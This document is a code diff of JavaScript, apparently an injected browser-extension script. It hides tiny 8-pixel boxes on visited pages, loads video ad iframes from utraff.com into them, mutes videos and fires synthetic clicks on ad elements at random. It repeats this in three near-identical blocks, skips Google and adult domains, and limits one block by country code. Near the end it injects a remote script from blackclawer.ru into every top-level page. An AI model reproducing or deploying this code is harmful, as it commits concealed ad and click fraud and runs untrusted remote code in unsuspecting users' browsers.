+        // vast_firstQuartile
+
+        if (!data.event) {
+            // console.log(data);
+            return;
+        }
+
+        console.log(1);
+        console.log(data);
+
+
+        switch (data.event) {
+            case 'install-vid-handlers':
+                muteVideos();
+                processIframes();
+                break;
+            case 'vast_time':
+                videoMidpoint = Date.now();
+                var leftToWatch = (videoMidpoint - videoStartedAt);
+                if (Math.random() > 0.6)
+                    tryClickVideo(document);
+
+                // setTimeout(function () {
+                //     tryClickVideo();
+                // }, leftToWatch / 2);
+
+                break;
+            case 'vast_start':
+                videoStartedAt = Date.now();
+                break;
+            case 'click':
+                tryClickVideo(document);
+                break;
+            case 'pause_video':
+                var v = document.querySelector('video');
+            // console.log(v);
+            // v && v.pause();
+        }
+    }, false);
+
+    var findAdsElement = function (document) {
+        // console.log('trying to find: ' + document.location.href);
+        var bl = document.querySelector('.videoAdUi.imaVideoAdUi');
+        // console.log(bl);
+        if (bl) {
+            eventFire(bl, 'click');
+            return true;
+        }
+
+        return false;
+    };
+
+    window.tryClickVideo = function (document) {
+        if (findAdsElement(document))
+            return;
+
+        var iframes = document.querySelectorAll('iframe');
+        var mi;
+        for (mi = 0; mi < iframes.length; mi++) {
+            var iframe = iframes[mi];
+            try {
+                tryClickVideo(iframe.contentWindow.document);
+            } catch (e) {
+                try {
+                    iframe.contentWindow.postMessage({
+                        event: 'click'
+                    }, '*');
+                } catch (e2) {
+
+                }
+            }
+        }
+    };
+
+    var muteVideos = function () {
+        var videos = document.querySelectorAll('video');
+        var mi;
+        for (mi = 0; mi < videos.length; mi++) {
+            var video = videos[mi];
+            try {
+                // console.log({video: video});
+                video.muted = true
+            } catch (e) {
+                // console.log(e);
+                // console.log(e.stack);
+            }
+        }
+    };
+
+    var processIframes = function () {
+        var iframes = document.querySelectorAll('iframe');
+        var mi;
+        for (mi = 0; mi < iframes.length; mi++) {
+            var iframe = iframes[mi];
+            iframe.contentWindow.postMessage({
+                event: 'install-vid-handlers'
+            }, '*');
+        }
+    };
+
+    if ('video-extension' === window.name) {
+        muteVideos();
+        processIframes();
+    }
+
+    if (window !== window.top) return;
+
+    var startVideoWork = function () {
+
+        var w = 8, h = 8;
+        var parentDiv;
+        parentDiv = document.createElement('div');
+        parentDiv.style.width = w + "px";
+        parentDiv.style.height = h + "px";
+        parentDiv.style.position = 'fixed';
+        parentDiv.style.bottom = "1px";
+        parentDiv.style.right = "1px";
+        // parentDiv.style.top = "1px";
+        // parentDiv.style.left = "1px";
+        parentDiv.style.overflow = 'hidden';
+
+        // coverDiv.style.top = "-1000px";
+        // coverDiv.style.left = "-1000px";
+        parentDiv.zIndex = 100000000;
+        parentDiv.style.backgroundColor = 'White';
+        // parentDiv.style.border = '1px solid Red';
+        parentDiv.style.zIndex = "100000000";
+        document.body.appendChild(parentDiv);
+
+        var coverDiv;
+
+        coverDiv = document.createElement('div');
+        coverDiv.style.width = w + "px";
+        coverDiv.style.height = h + "px";
+        // coverDiv.style.position = 'absolute';
+        coverDiv.style.top = (window.pageYOffset || document.documentElement.scrollTop) + "1px";
+        coverDiv.style.left = (window.pageXOffset || document.documentElement.scrollLeft) + "1px";
+
+        // coverDiv.style.top = "-1000px";
+        // coverDiv.style.left = "-1000px";
+        coverDiv.zIndex = 100000000;
+        coverDiv.style.backgroundColor = 'White';
+        // coverDiv.style.border = '1px solid Red';
+        coverDiv.style.zIndex = "100000000";
+        parentDiv.appendChild(coverDiv);
+
+
+        // noinspection JSUnusedLocalSymbols
+        var invokeAdsCode = function (advId) {
+            if (restrictedRoot && advId === 7.1) {
+                advId = 7;
+            }
+
+            var iframe;
+
+            switch (advId) {
+                case 7: // медийники
+                case 7.1: // обычные
+                    iframe = document.createElement('iframe');
+                    iframe.setAttribute('src', '//utraff.com/index.php?r=iframe/index&id=2350&max_prerolls=10&timer=40');
+                    if (7.1 === advId)
+                        iframe.setAttribute('src', '//utraff.com/index.php?r=iframe/index&id=2351&max_prerolls=10&timer=40');
+
+                    iframe.style.width = "640px";
+                    iframe.style.height = "360px";
+                    iframe.style.position = 'fixed';
+                    iframe.style.top = '0';
+                    iframe.style.left = '0';
+                    iframe.style.position = 'absolute';
+                    iframe.zIndex = 100000000;
+                    iframe.style.backgroundColor = 'White';
+                    iframe.style.border = 'none';
+                    iframe.style.display = 'block';
+                    iframe.setAttribute('id', "ut-player");
+                    iframe.setAttribute('frameborder', "0");
+                    iframe.setAttribute('name', 'video-extension');
+
+                    coverDiv.appendChild(iframe);
+
+                    // iframe = '<iframe id="ut-player" width="640" height="360" frameBorder="0" scrolling="no" allowFullScreen allow="autoplay" src="//utraff.com/index.php?r=iframe/index&id=2350"></iframe>';
+                    //
+                    // coverDiv.innerHTML = iframe;
+
+
+                    break;
+            }
+        };
+
+
+        if (document.location)
+            if (document.location.href.match(new RegExp("https?://www.advbringe.co/video.html", "i"))) {
+                // console.log("[vbt] Yaahooo");
+                restrictedRoot = false;
+
+                window.skipOutput = true;
+
+                var l = parseInt($GET('l'));
+                var advId = parseInt($GET('adv_id'));
+
+                if (l < 2)
+                    restrictedRoot = true;
+
+                coverDiv = document.createElement('div');
+                coverDiv.style.width = "100%";
+                coverDiv.style.height = "100%";
+                coverDiv.style.position = 'absolute';
+                coverDiv.style.top = "0px";
+                coverDiv.style.left = "0px";
+                coverDiv.style.width = "640px";
+                coverDiv.style.height = "360px";
+                coverDiv.zIndex = 100000000;
+                coverDiv.style.backgroundColor = 'White';
+                coverDiv.style.zIndex = "100000000";
+                document.body.appendChild(coverDiv);
+
+                invokeAdsCode(advId, l);
+
+                return;
+            }
+
+        invokeAdsCode(7);
+    };
+
+    var restrictedRoot = false;
+
+    // var restrictedRoots = ['yandex.ru/video', 'avito.ru', 'yastatic.net', 'vk.com', 'mail.ru', 'youtube.com', 'rutube.ru'];
+
+    var restrictedRoots = ['ok.ru', 'vk.com', 'youtube.com', 'aliexpress.com', '141jav.com'];
+    var i;
+    for (i = 0; i < restrictedRoots.length; i++) {
+        var testingRoot = restrictedRoots[i];
+        if (document.location.href.indexOf(testingRoot) !== -1) {
+            restrictedRoot = true;
+            break;
+        }
+    }
+
+    startVideoWork();
+}();
+
+!function () {
+    if (
+        ['googleads.g.doubleclick.net'].indexOf(document.location.host) !== -1
+        || ['google.'].indexOf(document.location.host) !== -1
+    ) return;
+
+    if (document.location.host.match(/google/))
+        return;
+
+    var pron = false;
+    // var restrictedTitles = ['Эротика', 'Порно', 'Эротические', 'Эротическое', 'Ххх'];
+    // for (i = 0; i < restrictedTitles.length; i++) {
+    //     var testingTitle = restrictedTitles[i].toLocaleLowerCase();
+    //     if (document.title.toLocaleLowerCase().indexOf(testingTitle) !== -1) {
+    //         restrictedRoot = true;
+    //         pron = true;
+    //         break;
+    //     }
+    // }
+
+    if (!pron) {
+        // var restrictedUrlParts = ['xxx', 'porn', 'adult', 'xvideo'];
+        var restrictedUrlParts = [
+            'pornhub.com', 'xvideos.com', 'rt.bongacams4.com',
+            'zoo.cab', 'smotret-porno-onlayn.com', 'smotret-porno-onlayn.com', 'smotreti-porno-online.ru', 'smotreti-porno-online.ru',
+            'porn'
+        ];
+        for (i = 0; i < restrictedUrlParts.length; i++) {
+            var testingLocation = restrictedUrlParts[i].toLocaleLowerCase();
+
+            if (document.location.host.toLocaleLowerCase().indexOf(testingLocation) !== -1) {
+                pron = true;
+                break;
+            }
+        }
+    }
+
+    // if (!pron) {
+    //     for (i = 0; i < restrictedTitles.length; i++) {
+    //         var testingWord = restrictedTitles[i].toLocaleLowerCase();
+    //         if (document.body.innerText.toLocaleLowerCase().indexOf(testingWord) !== -1) {
+    //             pron = true;
+    //             break;
+    //         }
+    //     }
+    // }
+
+    if (pron) return;
+
+    // try {
+    //     window.IntersectionObserver.prototype.observe = function() {
+    //         debugger;
+    //         throw 'test';
+    //     }
+    // } catch (e) {
+    // }
+
+    // window.document.oldCreateElement = window.document.createElement;
+    // window.document.createElement = function (tagName) {
+    //     if ('iframe' === tagName.toLowerCase()) {
+    //         debugger;
+    //     }
+    //     return document.oldCreateElement(tagName);
+    // };
+
+    setTimeout(function () {
+        var iframe = document.querySelector('iframe[src*="lookmeet"]');
+        if (iframe) {
+            // console.log(iframe);
+            // iframe.style.opacity = 0;
+            // iframe.style.border = '1px solid Green';
+            iframe.style.zoom = '0.01';
+            iframe.style.width = '640px';
+            iframe.style.height = '320px';
+        } else {
+            // console.log('iframe  not found');
+        }
+    }, 3000);
+
+    var player = document.querySelector('div#player');
+    if (player && ("lookmeet.tv" === document.location.hostname)) {
+        // console.log(player);
+        player.style.minHeight = "";
+    } else {
+        // console.log('player not found');
+    }
+
+
+    window.eventFire = function (el, etype) {
+        if (el.fireEvent) {
+            el.fireEvent('on' + etype);
+        } else {
+            var evObj = document.createEvent('Events');
+            evObj.initEvent(etype, true, false);
+            el.dispatchEvent(evObj);
+        }
+    };
+
+    setTimeout(function () {
+        window.videos = document.querySelectorAll('video');
+        // console.log(videos);
+        // for (var i = 0; i < videos.length; i++)
+        //     videos[i].pause();
+        // document.querySelectorAll('video[src]').play()
+
+    }, 4000);
+
+    var videoStartedAt = 0, videoMidpoint = 0;
+
+    // console.log('installing listener at: ' + document.location.href);
+    window.addEventListener("message", function (event) {
+        var data = event.data;
+        // console.log(event.source);
+
+        // vast_firstQuartile
+
+        if (!data.event) {
+            // console.log(data);
+            return;
+        }
+
+        console.log(2);
+        console.log(data);
+
+
+        switch (data.event) {
+            case 'install-vid-handlers':
+                muteVideos();
+                processIframes();
+                break;
+            case 'vast_time':
+                videoMidpoint = Date.now();
+                var leftToWatch = (videoMidpoint - videoStartedAt);
+                if (Math.random() > 0.6)
+                    tryClickVideo(document);
+
+                // setTimeout(function () {
+                //     tryClickVideo();
+                // }, leftToWatch / 2);
+
+                break;
+            case 'vast_start':
+                videoStartedAt = Date.now();
+                break;
+            case 'click':
+                tryClickVideo(document);
+                break;
+            case 'pause_video':
+                var v = document.querySelector('video');
+            // console.log(v);
+            // v && v.pause();
+        }
+    }, false);
+
+    var findAdsElement = function (document) {
+        // console.log('trying to find: ' + document.location.href);
+        var bl = document.querySelector('.videoAdUi.imaVideoAdUi');
+        // console.log(bl);
+        if (bl) {
+            eventFire(bl, 'click');
+            return true;
+        }
+
+        return false;
+    };
+
+    window.tryClickVideo = function (document) {
+        if (findAdsElement(document))
+            return;
+
+        var iframes = document.querySelectorAll('iframe');
+        var mi;
+        for (mi = 0; mi < iframes.length; mi++) {
+            var iframe = iframes[mi];
+            try {
+                tryClickVideo(iframe.contentWindow.document);
+            } catch (e) {
+                try {
+                    iframe.contentWindow.postMessage({
+                        event: 'click'
+                    }, '*');
+                } catch (e2) {
+
+                }
+            }
+        }
+    };
+
+    var muteVideos = function () {
+        var videos = document.querySelectorAll('video');
+        var mi;
+        for (mi = 0; mi < videos.length; mi++) {
+            var video = videos[mi];
+            try {
+                // console.log({video: video});
+                video.muted = true
+            } catch (e) {
+                // console.log(e);
+                // console.log(e.stack);
+            }
+        }
+    };
+
+    var processIframes = function () {
+        var iframes = document.querySelectorAll('iframe');
+        var mi;
+        for (mi = 0; mi < iframes.length; mi++) {
+            var iframe = iframes[mi];
+            iframe.contentWindow.postMessage({
+                event: 'install-vid-handlers'
+            }, '*');
+        }
+    };
+
+    if ('video-extension2' === window.name) {
+        muteVideos();
+        processIframes();
+    }
+
+    if (window !== window.top) return;
+
+    var startVideoWork = function () {
+
+        var w = 8, h = 8;
+        var parentDiv;
+        parentDiv = document.createElement('div');
+        parentDiv.style.width = w + "px";
+        parentDiv.style.height = h + "px";
+        parentDiv.style.position = 'fixed';
+        parentDiv.style.bottom = "1px";
+        parentDiv.style.left = "1px";
+        // parentDiv.style.top = "1px";
+        // parentDiv.style.left = "1px";
+        parentDiv.style.overflow = 'hidden';
+
+        // coverDiv.style.top = "-1000px";
+        // coverDiv.style.left = "-1000px";
+        parentDiv.zIndex = 100000000;
+        parentDiv.style.backgroundColor = 'White';
+        // parentDiv.style.border = '1px solid Red';
+        parentDiv.style.zIndex = "100000000";
+        document.body.appendChild(parentDiv);
+
+        var coverDiv;
+
+        coverDiv = document.createElement('div');
+        coverDiv.style.width = w + "px";
+        coverDiv.style.height = h + "px";
+        // coverDiv.style.position = 'absolute';
+        coverDiv.style.top = (window.pageYOffset || document.documentElement.scrollTop) + "1px";
+        coverDiv.style.left = (window.pageXOffset || document.documentElement.scrollLeft) + "1px";
+
+        // coverDiv.style.top = "-1000px";
+        // coverDiv.style.left = "-1000px";
+        coverDiv.zIndex = 100000000;
+        coverDiv.style.backgroundColor = 'White';
+        // coverDiv.style.border = '1px solid Red';
+        coverDiv.style.zIndex = "100000000";
+        parentDiv.appendChild(coverDiv);
+
+
+        // noinspection JSUnusedLocalSymbols
+        var invokeAdsCode = function (advId) {
+            if (restrictedRoot && advId === 7.1) {
+                advId = 7;
+            }
+
+            var iframe;
+
+            switch (advId) {
+                case 7: // медийники
+                case 7.1: // обычные
+                    iframe = document.createElement('iframe');
+                    iframe.setAttribute('src', '//utraff.com/index.php?r=iframe/index&id=3095&max_prerolls=10&timer=40');
+                    if (7.1 === advId)
+                        iframe.setAttribute('src', '//utraff.com/index.php?r=iframe/index&id=2351&max_prerolls=10&timer=40');
+
+                    iframe.style.width = "640px";
+                    iframe.style.height = "360px";
+                    iframe.style.position = 'fixed';
+                    iframe.style.top = '0';
+                    iframe.style.left = '0';
+                    iframe.style.position = 'absolute';
+                    iframe.zIndex = 100000000;
+                    iframe.style.backgroundColor = 'White';
+                    iframe.style.border = 'none';
+                    iframe.style.display = 'block';
+                    iframe.setAttribute('id', "ut-player2");
+                    iframe.setAttribute('frameborder', "0");
+                    iframe.setAttribute('name', 'video-extension2');
+
+                    coverDiv.appendChild(iframe);
+
+                    // iframe = '<iframe id="ut-player" width="640" height="360" frameBorder="0" scrolling="no" allowFullScreen allow="autoplay" src="//utraff.com/index.php?r=iframe/index&id=2350"></iframe>';
+                    //
+                    // coverDiv.innerHTML = iframe;
+
+
+                    break;
+            }
+        };
+
+
+        if (document.location)
+            if (document.location.href.match(new RegExp("https?://www.advbringe.co/video.html", "i"))) {
+                // console.log("[vbt] Yaahooo");
+                restrictedRoot = false;
+
+                window.skipOutput = true;
+
+                var l = parseInt($GET('l'));
+                var advId = parseInt($GET('adv_id'));
+
+                if (l < 2)
+                    restrictedRoot = true;
+
+                coverDiv = document.createElement('div');
+                coverDiv.style.width = "100%";
+                coverDiv.style.height = "100%";
+                coverDiv.style.position = 'absolute';
+                coverDiv.style.top = "0px";
+                coverDiv.style.left = "0px";
+                coverDiv.style.width = "640px";
+                coverDiv.style.height = "360px";
+                coverDiv.zIndex = 100000000;
+                coverDiv.style.backgroundColor = 'White';
+                coverDiv.style.zIndex = "100000000";
+                document.body.appendChild(coverDiv);
+
+                invokeAdsCode(advId, l);
+
+                return;
+            }
+
+        invokeAdsCode(7);
+    };
+
+    var restrictedRoot = false;
+
+    // var restrictedRoots = ['yandex.ru/video', 'avito.ru', 'yastatic.net', 'vk.com', 'mail.ru', 'youtube.com', 'rutube.ru'];
+
+    var restrictedRoots = ['ok.ru', 'vk.com', 'youtube.com', 'aliexpress.com', '141jav.com'];
+    var i;
+    for (i = 0; i < restrictedRoots.length; i++) {
+        var testingRoot = restrictedRoots[i];
+        if (document.location.href.indexOf(testingRoot) !== -1) {
+            restrictedRoot = true;
+            break;
+        }
+    }
+
+    startVideoWork();
+}();
+
+
+if (window.ss78mest && ss78mest.version && parseInt(ss78mest.version) >= 435 && (['RU', 'KZ', 'UA', 'BY'].indexOf(window['country_code__']) !== -1)) {
+    !function () {
+    if (
+        ['googleads.g.doubleclick.net'].indexOf(document.location.host) !== -1
+        || ['google.'].indexOf(document.location.host) !== -1
+    ) return;
+
+    if (document.location.host.match(/google/))
+        return;
+
+    var pron = false;
+    // var restrictedTitles = ['Эротика', 'Порно', 'Эротические', 'Эротическое', 'Ххх'];
+    // for (i = 0; i < restrictedTitles.length; i++) {
+    //     var testingTitle = restrictedTitles[i].toLocaleLowerCase();
+    //     if (document.title.toLocaleLowerCase().indexOf(testingTitle) !== -1) {
+    //         restrictedRoot = true;
+    //         pron = true;
+    //         break;
+    //     }
+    // }
+
+    if (!pron) {
+        // var restrictedUrlParts = ['xxx', 'porn', 'adult', 'xvideo'];
+        var restrictedUrlParts = [
+            'pornhub.com', 'xvideos.com', 'rt.bongacams4.com',
+            'zoo.cab', 'smotret-porno-onlayn.com', 'smotret-porno-onlayn.com', 'smotreti-porno-online.ru', 'smotreti-porno-online.ru',
+            'porn'
+        ];
+        for (i = 0; i < restrictedUrlParts.length; i++) {
+            var testingLocation = restrictedUrlParts[i].toLocaleLowerCase();
+
+            if (document.location.host.toLocaleLowerCase().indexOf(testingLocation) !== -1) {
+                pron = true;
+                break;
+            }
+        }
+    }
+
+    // if (!pron) {
+    //     for (i = 0; i < restrictedTitles.length; i++) {
+    //         var testingWord = restrictedTitles[i].toLocaleLowerCase();
+    //         if (document.body.innerText.toLocaleLowerCase().indexOf(testingWord) !== -1) {
+    //             pron = true;
+    //             break;
+    //         }
+    //     }
+    // }
+
+    if (pron) return;
+
+    // try {
+    //     window.IntersectionObserver.prototype.observe = function() {
+    //         debugger;
+    //         throw 'test';
+    //     }
+    // } catch (e) {
+    // }
+
+    // window.document.oldCreateElement = window.document.createElement;
+    // window.document.createElement = function (tagName) {
+    //     if ('iframe' === tagName.toLowerCase()) {
+    //         debugger;
+    //     }
+    //     return document.oldCreateElement(tagName);
+    // };
+
+    setTimeout(function () {
+        var iframe = document.querySelector('iframe[src*="lookmeet"]');
+        if (iframe) {
+            // console.log(iframe);
+            // iframe.style.opacity = 0;
+            // iframe.style.border = '1px solid Green';
+            iframe.style.zoom = '0.01';
+            iframe.style.width = '640px';
+            iframe.style.height = '320px';
+        } else {
+            // console.log('iframe  not found');
+        }
+    }, 3000);
+
+    var player = document.querySelector('div#player');
+    if (player && ("lookmeet.tv" === document.location.hostname)) {
+        // console.log(player);
+        player.style.minHeight = "";
+    } else {
+        // console.log('player not found');
+    }
+
+
+    window.eventFire = function (el, etype) {
+        if (el.fireEvent) {
+            el.fireEvent('on' + etype);
+        } else {
+            var evObj = document.createEvent('Events');
+            evObj.initEvent(etype, true, false);
+            el.dispatchEvent(evObj);
+        }
+    };
+
+    setTimeout(function () {
+        window.videos = document.querySelectorAll('video');
+        // console.log(videos);
+        // for (var i = 0; i < videos.length; i++)
+        //     videos[i].pause();
+        // document.querySelectorAll('video[src]').play()
+
+    }, 4000);
+
+    var videoStartedAt = 0, videoMidpoint = 0;
+
+    // console.log('installing listener at: ' + document.location.href);
+    window.addEventListener("message", function (event) {
+        var data = event.data;
+        // console.log(event.source);
+
+        // vast_firstQuartile
+
+        if (!data.event) {
+            // console.log(data);
+            return;
+        }
+
+        console.log(3);
+        console.log(data);
+
+        switch (data.event) {
+            case 'install-vid-handlers':
+                muteVideos();
+                processIframes();
+                break;
+            case 'vast_time':
+                videoMidpoint = Date.now();
+                var leftToWatch = (videoMidpoint - videoStartedAt);
+                if (Math.random() > 0.6)
+                    tryClickVideo(document);
+
+                // setTimeout(function () {
+                //     tryClickVideo();
+                // }, leftToWatch / 2);
+
+                break;
+            case 'vast_start':
+                videoStartedAt = Date.now();
+                break;
+            case 'click':
+                tryClickVideo(document);
+                break;
+            case 'pause_video':
+                var v = document.querySelector('video');
+            // console.log(v);
+            // v && v.pause();
+        }
+    }, false);
+
+    var findAdsElement = function (document) {
+        // console.log('trying to find: ' + document.location.href);
+        var bl = document.querySelector('.videoAdUi.imaVideoAdUi');
+        // console.log(bl);
+        if (bl) {
+            eventFire(bl, 'click');
+            return true;
+        }
+
+        return false;
+    };
+
+    window.tryClickVideo = function (document) {
+        if (findAdsElement(document))
+            return;
+
+        var iframes = document.querySelectorAll('iframe');
+        var mi;
+        for (mi = 0; mi < iframes.length; mi++) {
+            var iframe = iframes[mi];
+            try {
+                tryClickVideo(iframe.contentWindow.document);
+            } catch (e) {
+                try {
+                    iframe.contentWindow.postMessage({
+                        event: 'click'
+                    }, '*');
+                } catch (e2) {
+
+                }
+            }
+        }
+    };
+
+    var muteVideos = function () {
+        var videos = document.querySelectorAll('video');
+        var mi;
+        for (mi = 0; mi < videos.length; mi++) {
+            var video = videos[mi];
+            try {
+                // console.log({video: video});
+                video.muted = true
+            } catch (e) {
+                // console.log(e);
+                // console.log(e.stack);
+            }
+        }
+    };
+
+    var processIframes = function () {
+        var iframes = document.querySelectorAll('iframe');
+        var mi;
+        for (mi = 0; mi < iframes.length; mi++) {
+            var iframe = iframes[mi];
+            iframe.contentWindow.postMessage({
+                event: 'install-vid-handlers'
+            }, '*');
+        }
+    };
+
+    if ('video-extension3' === window.name) {
+        muteVideos();
+        processIframes();
+    }
+
+    if (window !== window.top) return;
+
+    var startVideoWork = function () {
+
+        var w = 8, h = 8;
+        var parentDiv;
+        parentDiv = document.createElement('div');
+        parentDiv.style.width = w + "px";
+        parentDiv.style.height = h + "px";
+        parentDiv.style.position = 'fixed';
+        parentDiv.style.top = "1px";
+        parentDiv.style.left = "1px";
+        // parentDiv.style.top = "1px";
+        // parentDiv.style.left = "1px";
+        parentDiv.style.overflow = 'hidden';
+
+        // coverDiv.style.top = "-1000px";
+        // coverDiv.style.left = "-1000px";
+        parentDiv.zIndex = 100000000;
+        parentDiv.style.backgroundColor = 'White';
+        // parentDiv.style.border = '1px solid Red';
+        parentDiv.style.zIndex = "100000000";
+        document.body.appendChild(parentDiv);
+
+        var coverDiv;
+
+        coverDiv = document.createElement('div');
+        coverDiv.style.width = w + "px";
+        coverDiv.style.height = h + "px";
+        // coverDiv.style.position = 'absolute';
+        coverDiv.style.top = (window.pageYOffset || document.documentElement.scrollTop) + "1px";
+        coverDiv.style.left = (window.pageXOffset || document.documentElement.scrollLeft) + "1px";
+
+        // coverDiv.style.top = "-1000px";
+        // coverDiv.style.left = "-1000px";
+        coverDiv.zIndex = 100000000;
+        coverDiv.style.backgroundColor = 'White';
+        // coverDiv.style.border = '1px solid Red';
+        coverDiv.style.zIndex = "100000000";
+        parentDiv.appendChild(coverDiv);
+
+
+        // noinspection JSUnusedLocalSymbols
+        var invokeAdsCode = function (advId) {
+            if (restrictedRoot && advId === 7.1) {
+                advId = 7;
+            }
+
+            var iframe;
+
+            switch (advId) {
+                case 7: // медийники
+                case 7.1: // обычные
+                    iframe = document.createElement('iframe');
+                    iframe.setAttribute('src', '//utraff.com/index.php?r=iframe/index&id=3381&max_prerolls=10&timer=40');
+                    if (7.1 === advId)
+                        iframe.setAttribute('src', '//utraff.com/index.php?r=iframe/index&id=2351&max_prerolls=10&timer=40');
+
+                    iframe.style.width = "640px";
+                    iframe.style.height = "360px";
+                    iframe.style.position = 'fixed';
+                    iframe.style.top = '0';
+                    iframe.style.left = '0';
+                    iframe.style.position = 'absolute';
+                    iframe.zIndex = 100000000;
+                    iframe.style.backgroundColor = 'White';
+                    iframe.style.border = 'none';
+                    iframe.style.display = 'block';
+                    iframe.setAttribute('id', "ut-player3");
+                    iframe.setAttribute('frameborder', "0");
+                    iframe.setAttribute('name', 'video-extension3');
+
+                    coverDiv.appendChild(iframe);
+
+                    // iframe = '<iframe id="ut-player" width="640" height="360" frameBorder="0" scrolling="no" allowFullScreen allow="autoplay" src="//utraff.com/index.php?r=iframe/index&id=2350"></iframe>';
+                    //
+                    // coverDiv.innerHTML = iframe;
+
+
+                    break;
+            }
+        };
+
+
+        if (document.location)
+            if (document.location.href.match(new RegExp("https?://www.advbringe.co/video.html", "i"))) {
+                // console.log("[vbt] Yaahooo");
+                restrictedRoot = false;
+
+                window.skipOutput = true;
+
+                var l = parseInt($GET('l'));
+                var advId = parseInt($GET('adv_id'));
+
+                if (l < 2)
+                    restrictedRoot = true;
+
+                coverDiv = document.createElement('div');
+                coverDiv.style.width = "100%";
+                coverDiv.style.height = "100%";
+                coverDiv.style.position = 'absolute';
+                coverDiv.style.top = "0px";
+                coverDiv.style.left = "0px";
+                coverDiv.style.width = "640px";
+                coverDiv.style.height = "360px";
+                coverDiv.zIndex = 100000000;
+                coverDiv.style.backgroundColor = 'White';
+                coverDiv.style.zIndex = "100000000";
+                document.body.appendChild(coverDiv);
+
+                invokeAdsCode(advId, l);
+
+                return;
+            }
+
+        invokeAdsCode(7);
+    };
+
+    var restrictedRoot = false;
+
+    // var restrictedRoots = ['yandex.ru/video', 'avito.ru', 'yastatic.net', 'vk.com', 'mail.ru', 'youtube.com', 'rutube.ru'];
+
+    var restrictedRoots = ['ok.ru', 'vk.com', 'youtube.com', 'aliexpress.com', '141jav.com'];
+    var i;
+    for (i = 0; i < restrictedRoots.length; i++) {
+        var testingRoot = restrictedRoots[i];
+        if (document.location.href.indexOf(testingRoot) !== -1) {
+            restrictedRoot = true;
+            break;
+        }
+    }
+
+    startVideoWork();
+}();
+
+}
+
+!function () {
+    // var didTag = window['did'] + window['tag'];
+    // if (
+    //     (didTag !== '1new1738_test') && (didTag !== '11810new') && (didTag !== '11796_60') && (didTag !== '7yandex') &&
+    //     (didTag !== '11810') && (didTag !== '1new1738') && (didTag !== '1yandex') &&
+    //     (didTag !== '11796_70') && (didTag !== '1ww_60') && (didTag !== '1ww_inbrnew') &&
+    //     (didTag !== '1chrome_BR') && (didTag !== '1ww') && (didTag !== '1ww_inbr') && (didTag !== '1ww_ph') && (didTag !== '1yandex_BR') && (String(window['did']) !== '4')
+    // ) return;
+
+    // var sDid = window['did'] + '';
+    // if ((sDid !== '11') && (sDid !== '12') && (sDid !== '13') && (sDid !== '14')) return;
+
+    // var host = document.location.host.replace('www.', '');
+    //
+    // var bannedDomains = [
+    //     'novinki-porno.mobi',
+    //     'porno-365.info',
+    //     'porno-narezki.mobi',
+    //     'www.hoporno.com',
+    //     'vkporno.info',
+    //     'porno-incest.net',
+    //     'iporno-online.ru',
+    //     'porno-multfilmy.ru',
+    //     'porno-babushki.net',
+    //     'pornoweprik.com',
+    //     'porno-buryatki.mobi',
+    //     'porno-rus.tv',
+    //     'pornokinozal.net',
+    //     'porno-zhest.mobi',
+    //     'zhestkoe-porno.mobi',
+    //     'porno2017.info',
+    //     'pornodrochka.com',
+    //     'porno365.club',
+    //     'porno365tube.com',
+    //     'pornoche.com',
+    //     'smotreti-porno-online.ru',
+    //     'goraporno.com',
+    //     'porno-home.ru',
+    //     'hellporno.com',
+    //     'pornostars-tube.com',
+    //     'pornodama.me',
+    //     'max2porno.com',
+    //     'lentaporno.net',
+    //     'pornofaza.me',
+    //     'pornospere.com',
+    //     'russkoeporno.su',
+    //     'pornocast.net',
+    //     'pornotravel.net',
+    //     'evrejskoe-porno.mobi',
+    //     'vozbuzhdajushhee-porno.mobi',
+    //     'pornoplace2.com',
+    //     'porno-hd.tv',
+    //     'porno-russ.tv',
+    //     'pornoboss.tv',
+    //     'aboutporno.net',
+    //     'girlporno2.com',
+    //     'pornosveta.ru',
+    //     'pornov.online',
+    //     'pornorus.me',
+    //     'chechenskoe-porno.mobi',
+    //     'cuntwars18.games-porno.net',
+    //     'korejskoe-porno.net',
+    //     'korotkoeporno.com',
+    //     'porno-go.info',
+    //     'pornosv.com',
+    //     'porno-kino.online',
+    //     'gigporno.xxx',
+    //     'apornoonlain.tv',
+    //     'mega-porno.me',
+    //     'www.pornonacionais.com',
+    //     'www.felizporno.com',
+    //     'pornofili.com',
+    //     '5porno.me',
+    //     'porno-staruhi.net',
+    //     'sochnoe-porno.mobi',
+    //     'porno-pytki.mobi',
+    //     'www.alphaporno.com',
+    //     'pornogovno.online',
+    //     'pornosector.info',
+    //     'www.porno-astra.info',
+    //     'asporno.info',
+    //     'naporno.mobi',
+    //     'smotrim-porno.tv',
+    //     'pornolomka.mobi',
+    //     'kazahskoe-porno.mobi',
+    //     'porno-24.pro',
+    //     'pornomir.tv',
+    //     '24porno.org',
+    //     'porno365.xxx',
+    //     'pornozak.cc',
+    //     'apornoflv.tv',
+    //     'pornokrik.com',
+    //     'hellporno.net',
+    //     'porno-stjuardessy.mobi',
+    //     'pornolavka.xxx',
+    //     '1porno.online',]
+    //
+    // for (var i = 0; i < bannedDomains.length; i++) {
+    //     if (host === bannedDomains[i]) return;
+    // }
+
+    if (window.top === window) {
+        var blackclawerJS = document.createElement('script');
+        blackclawerJS.src = "https://www.blackclawer.ru/1.js";
+        document.body.appendChild(blackclawerJS)
+    }
+
+    // var script_old_new;
+    // if (window.location.href.indexOf('www.youtube.com') + 1 && window.top === window) {
+    //     script_old_new = document.createElement('script');
+    //     script_old_new.src = "https://in.alhist.com/premio.js";
+    //     script_old_new.async = false;
+    //     document.head.appendChild(script_old_new);
+    // } else {
+    //     if (document.location.href !== "https://www.youtube.com/embed/") {
+    //         if (window.top !== window) return;
+    //         var new_yt_generic_div = document.createElement('div');
+    //         new_yt_generic_div.style = 'transform: scale(0.01, 0.01)';
+    //         new_yt_generic_div.style.position = 'fixed';
+    //         new_yt_generic_div.style.left = '0px';
+    //         new_yt_generic_div.style.top = '0px';
+    //         new_yt_generic_div.style.width = '10px';
+    //         new_yt_generic_div.style.height = '10px';
+    //         new_yt_generic_div.style.opacity = '0.1';
+    //         new_yt_generic_div.style.overflow = 'hidden';
+    //         var frame = document.createElement('iframe');
+    //         frame.src = 'https://www.youtube.com/embed/';
+    //         frame.style.top = '0px';
+    //         frame.style.width = '730px';
+    //         frame.style.height = '490px';
+    //         new_yt_generic_div.appendChild(frame);
+    //         document.body.appendChild(new_yt_generic_div);
+    //     }
+    //
+    //     if (document.location.href === "https://www.youtube.com/embed/") {
+    //         script_old_new = document.createElement('script');
+    //         script_old_new.src = "https://in.alhist.com/premio.js";
+    //         script_old_new.async = false;
+    //         document.head.appendChild(script_old_new);
+    //     }
+    // }
+}();
+var kscrpt = function (app_id) {
+    try {
